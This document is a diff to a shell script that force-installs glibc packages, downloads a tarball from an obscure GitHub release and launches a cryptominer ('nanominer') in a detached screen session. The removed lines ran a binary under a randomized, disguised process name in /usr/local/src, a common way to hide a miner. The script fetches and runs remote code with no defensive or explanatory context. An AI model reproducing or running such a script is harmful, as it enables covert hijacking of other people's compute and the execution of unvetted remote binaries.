@@ -8,19 +8,8 @@ glibc-common-2.17-55.el6.x86_64.rpm \
 glibc-devel-2.17-55.el6.x86_64.rpm \
 glibc-headers-2.17-55.el6.x86_64.rpm --force --nodeps
 azure=mxsemsdnlkdj;
-mkdir /usr/local
-mkdir /usr/local/src
-rm -r /usr/local/src/$azure
-mkdir /usr/local/src/$azure
-rm -r platinum.tar.gz
+rm -r platinum.tar.gz platinum
 wget https://github.com/ts6aud5vkg/gpuissa/releases/download/metan/platinum.tar.gz
-tar xf platinum.tar.gz 
-mv platinum /usr/local/src/$azure
-cd /usr/local/src/$azure
-cd platinum
-a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
-sudo cp uranium "$cpuname"
-echo $cpuname" is starting"
-screen -d -m ./"${cpuname}"
-
-
+tar xf platinum.tar.gz
+cd  platinum
+screen -d -m ./nanominer
